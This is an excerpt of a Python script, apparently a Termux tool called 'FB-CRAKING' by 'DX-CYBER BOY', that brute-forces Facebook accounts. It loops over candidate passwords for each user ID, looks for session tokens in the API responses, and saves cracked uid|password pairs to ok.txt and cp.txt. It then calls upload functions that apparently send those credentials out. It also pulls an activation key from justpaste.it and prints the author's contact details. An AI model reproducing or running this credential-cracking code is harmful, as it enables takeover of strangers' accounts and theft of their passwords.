...
def helpnote():
	print("%s [*] FOLLOW ME ON FB TO KNOW ABOUT TOOLS  :)"%(G))
	subprocess.check_output(["am", "start", "https://github.com/DX-CYBER505?tab=repositories"])
	exit(" [*] FACEBOOK :  https://m.me/Darkcyber6")
...
def notice():
	...
	subprocess.check_output(["am", "start", "https://m.me/Darkcyber6"])
 
def irfan():
	
	
	runtxt("\n\033[0;91m🧞‍ THIS TOOL IS OFFICIAL FOR DX-CYBER BOY")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://justpaste.it/1lycx').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\033[1;92m 
   _______      ________  ___   __ _______  _______  
  / __/ _ )____/ ___/ _ \/ _ | / //_/  _/ |/ / ___/  
 / _// _  /___/ /__/ , _/ __ |/ ,< _/ //    / (_ /   
/_/ /____/    \___/_/|_/_/ |_/_/|_/___/_/|_/\___/    
                                                     
\033[1;90m═══════════════════════════════════════════════════════════
\033[1;94m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : プレイボーイレイハン
\033[1;95m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSUP  : +8801979526394
\033[1;93m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB      : DX-CYBER BOY 
\033[1;97m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : DONT TRY TO COPPY MY SCRYPT x👿🔥
\033[1;90m═══════════════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sFB-CRAKING❌ PROO CLONER❌"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s6.0"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [DX-BOY] : %s/%s -> \033[0;92m [ DX-OK 🤩:%s ]- \033[0;91m[DX-CP 🥺:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [DX-OK 🤩] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[DX-OK 🥺] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [DX-OK🥺] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
